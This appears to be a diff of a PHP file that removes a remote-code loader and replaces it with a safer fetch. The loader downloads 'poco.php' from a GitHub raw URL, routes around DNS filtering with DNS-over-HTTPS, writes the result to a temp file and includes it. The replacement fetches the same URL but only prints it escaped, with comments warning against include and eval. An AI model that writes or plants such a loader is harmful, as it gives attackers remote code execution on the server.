@@ -1,33 +1,20 @@
 <?php
-
-set_time_limit(0);
-
+// Gunakan file_get_contents dengan timeout yang aman jika ingin mengambil konten
 $url = "https://raw.githubusercontent.com/bebert9505-boop/test/refs/heads/main/poco.php";
 
-$dns = "https://cloudflare-dns.com/dns-query";
+$context = stream_context_create([
+    "http" => [
+        "timeout" => 5
+    ]
+]);
 
-$ch = curl_init($url);
+$content = file_get_contents($url, false, $context);
 
-if (defined("CURLOPT_DOH_URL")) {
-  curl_setopt($ch, CURLOPT_DOH_URL, $dns);
+// Jangan gunakan include/eval/require! 
+// Lakukan validasi atau tampilkan data yang diambil
+if ($content !== false) {
+    echo htmlspecialchars($content); 
+} else {
+    echo "Gagal mengambil data.";
 }
-
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
-
-$res = curl_exec($ch);
-
-curl_close($ch);
-
-
-$tmp = tmpfile();
-
-$path_metadata = stream_get_meta_data($tmp);
-$path = $path_metadata["uri"];
-
-fprintf($tmp, "%s", $res);
-
-include $path;
-
 ?>
